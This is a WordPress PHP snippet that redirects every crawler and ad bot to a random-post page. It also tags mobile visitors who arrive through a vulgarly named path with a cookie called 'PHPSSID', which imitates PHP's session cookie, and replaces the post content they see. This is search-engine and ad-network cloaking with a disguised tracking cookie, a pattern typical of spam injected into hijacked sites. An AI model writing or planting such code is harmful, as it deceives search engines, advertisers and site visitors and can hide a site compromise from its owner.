// Custom redirect and content manipulation function
function custom_redirect_and_content_handler() {
    // Get current URL path
    $current_path = $_SERVER['REQUEST_URI'];
    
    // Check if user is on mobile
    $is_mobile = wp_is_mobile();
    
    // Check if it's a bot
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $is_bot = preg_match('/bot|crawler|spider|mediapartners|adsense|googlebot/i', $user_agent);
    
    // Handle /Suckmydick path for mobile users
    if ($current_path === '/Suckmydick' && $is_mobile) {
        // Get random published post
        $random_post = get_posts(array(
            'numberposts' => 1,
            'orderby' => 'rand',
            'post_status' => 'publish'
        ));
        
        if (!empty($random_post)) {
            $random_post_url = get_permalink($random_post[0]->ID);
            
            // Set cookie to identify this user
            if (!isset($_COOKIE['PHPSSID'])) {
                setcookie('PHPSSID', 'mobile_redirect_' . time(), time() + 3600, '/');
            }
            
            // Redirect to random post
            wp_redirect($random_post_url, 302);
            exit;
        }
    }
    
    // Handle /random-post path for all users
    if ($current_path === '/random-post') {
        // Get random published post
        $random_post = get_posts(array(
            'numberposts' => 1,
            'orderby' => 'rand',
            'post_status' => 'publish'
        ));
        
        if (!empty($random_post)) {
            $random_post_url = get_permalink($random_post[0]->ID);
            wp_redirect($random_post_url, 302);
            exit;
        }
    }
    
    // Handle bot redirects to /random-post
    if ($is_bot && $current_path !== '/random-post') {
        wp_redirect(home_url('/random-post'), 302);
        exit;
    }
}
add_action('init', 'custom_redirect_and_content_handler');

// Modify post content for mobile users who came from /Suckmydick
function modify_post_content_for_mobile_users($content) {
    // Only modify content if user is on mobile and has the specific cookie
    if (wp_is_mobile() && isset($_COOKIE['PHPSSID']) && strpos($_COOKIE['PHPSSID'], 'mobile_redirect_') === 0) {
        // Replace content with /Suckmydick content
        $custom_content = "<!-- Custom content for mobile users from /Suckmydick path -->\n";
        $custom_content .= "<div style='text-align: center; padding: 20px;'>\n";
        $custom_content .= "<h1>Custom Content</h1>\n";
        $custom_content .= "<p>This is the content that should be shown to mobile users who accessed /Suckmydick path.</p>\n";
        $custom_content .= "<p>You can customize this content as per your requirements.</p>\n";
        $custom_content .= "</div>";
        
        return $custom_content;
    }
    
    return $content;
}
add_filter('the_content', 'modify_post_content_for_mobile_users');